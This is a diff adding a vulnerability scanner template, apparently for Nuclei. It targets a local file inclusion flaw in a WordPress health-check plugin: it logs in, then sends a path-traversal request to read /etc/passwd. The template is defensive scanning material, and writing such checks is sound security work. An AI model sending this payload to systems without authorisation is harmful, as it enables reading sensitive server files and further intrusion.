@@ -1,0 +1,51 @@
+id: health-check-lfi
+
+info:
+  name: WordPress Health Check & Troubleshooting <1.24 - Local File Inclusion
+  author: DhiyaneshDK
+  severity: high
+  description: WordPress Health Check & Troubleshooting prior to 1.2.4 is vulnerable to local file inclusion. Exploitation does require authentication.
+  remediation: Upgrade to version 1.2.4 or later.
+  reference:
+    - https://wpscan.com/vulnerability/5eecc4a7-0b44-495d-9352-78dccebfc72a
+    - https://www.synacktiv.com/ressources/advisories/WordPress_Health_Check_1.2.3_Vulnerabilities.pdf
+  classification:
+    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
+    cvss-score: 7.5
+    cwe-id: CWE-22
+  metadata:
+    max-request: 2
+  tags: lfi,wp,wordpress,wp-plugin,authenticated,lfr,wpscan
+
+http:
+  - raw:
+      - |
+        POST /wp-login.php HTTP/1.1
+        Host: {{Hostname}}
+        Origin: {{RootURL}}
+        Content-Type: application/x-www-form-urlencoded
+
+        log={{username}}&pwd={{password}}&wp-submit=Log+In&testcookie=1
+      - |
+        POST /wp-admin/admin-ajax.php?action=wprss_fetch_items_row_action HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        action=health-check-view-file-diff&file=../../../../../../etc/passwd
+
+    matchers-condition: and
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - "root:.*:0:0:"
+
+      - type: word
+        part: header
+        words:
+          - application/json
+
+      - type: status
+        status:
+          - 200
+# digest: 4b0a00483046022100e30b503daef3e9868fbcf31db23dd2667f7cddeae66f95d3c8b2744355b00e30022100e16348b6a07755a77502151ed3c8464c3db94e47f819937841a1fa193412cd45:922c64590222798bb761d5b6d8e72950
